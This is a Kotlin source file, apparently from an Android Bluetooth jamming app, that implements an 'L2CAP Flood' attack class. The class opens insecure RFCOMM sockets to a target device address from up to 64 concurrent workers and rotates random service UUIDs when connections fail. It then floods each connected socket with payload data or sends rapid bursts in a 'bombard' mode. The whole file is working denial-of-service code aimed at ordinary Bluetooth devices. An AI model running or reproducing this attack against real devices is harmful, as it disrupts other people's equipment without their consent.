package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothSocket
import android.content.Context
import androidx.core.content.ContextCompat.getSystemService
import com.eikarna.bluetoothjammer.R
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.IOException
import java.util.Collections
import java.util.UUID

/**
 * L2CAP Flood (classic): opens RFCOMM sockets towards the target using random
 * service UUIDs and floods each connected socket with data.
 * This is the technique the app originally shipped with.
 */
class L2capFloodAttack(
    private val targetAddress: String,
    private val threads: Int = 8,
    private val rateDelayMs: Int = 0,
    private val payloadPattern: PayloadPattern = PayloadPattern.FIXED,
    private val payloadSize: Int = 0,
    private val bombard: Boolean = false
) : BluetoothAttack {

    private var appContext: Context? = null
    override val displayName: String
        get() = appContext?.getString(AttackType.L2CAP_FLOOD.labelRes) ?: AttackType.L2CAP_FLOOD.fallbackLabel
    override val description: String
        get() = appContext?.getString(AttackType.L2CAP_FLOOD.descRes) ?: AttackType.L2CAP_FLOOD.fallbackDesc

    private var bluetoothAdapter: BluetoothAdapter? = null
    private val sockets = Collections.synchronizedList(mutableListOf<BluetoothSocket>())
    private var scope: CoroutineScope? = null
    @Volatile
    private var running = false

    override fun isRunning() = running

    @SuppressLint("MissingPermission")
    override fun start(context: Context, onLog: (String) -> Unit) {
        if (running) return
        running = true
        appContext = context.applicationContext
        bluetoothAdapter = getSystemService(context, BluetoothManager::class.java)?.adapter
        val device: BluetoothDevice? = bluetoothAdapter?.getRemoteDevice(targetAddress)
        if (device == null) {
            running = false
            return
        }

        val workerCount = threads.coerceIn(1, 64)
        scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        onLog(context.getString(R.string.log_l2cap_started, targetAddress, workerCount))

        repeat(workerCount) { worker ->
            scope!!.launch {
                val baseUUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")
                var successfulUUID: UUID? = null
                while (isActive && running) {
                    val uuid = successfulUUID ?: baseUUID
                    var socket: BluetoothSocket? = null
                    try {
                        socket = device.createInsecureRfcommSocketToServiceRecord(uuid)
                        socket.connect()
                        if (socket.isConnected) {
                            successfulUUID = uuid
                            if (bombard) {
                                // Bombard: one burst then close, cycle fast
                                val size = if (payloadSize > 0) payloadSize else 600
                                socket.outputStream.write(payloadPattern.buffer(size))
                                onLog("[$worker][DATA] " + context.getString(R.string.log_bombard_burst))
                                runCatching { socket.close() }
                                jitterDelay(maxOf(50, rateDelayMs))
                            } else {
                                sockets.add(socket)
                                onLog("[$worker][CONN] " + context.getString(R.string.log_l2cap_connected, uuid))
                                FloodSupport.flood(context, socket, payloadPattern, payloadSize, rateDelayMs, { running }, onLog, "$worker")
                                sockets.remove(socket)
                                break
                            }
                        }
                    } catch (err: IOException) {
                        runCatching { socket?.close() }
                        successfulUUID = UUID.fromString(
                            UUID.randomUUID().toString().split("-")[0] + "-0000-1000-8000-00805F9B34FB"
                        )
                        if (isActive && running) onLog("[$worker][RETRY] " + context.getString(R.string.log_l2cap_retry))
                        jitterDelay(maxOf(100, rateDelayMs))
                    }
                }
            }
        }
    }

    override fun stop() {
        running = false
        scope?.cancel()
        scope = null
        synchronized(sockets) {
            sockets.forEach { s -> runCatching { s.close() } }
            sockets.clear()
        }
    }
}
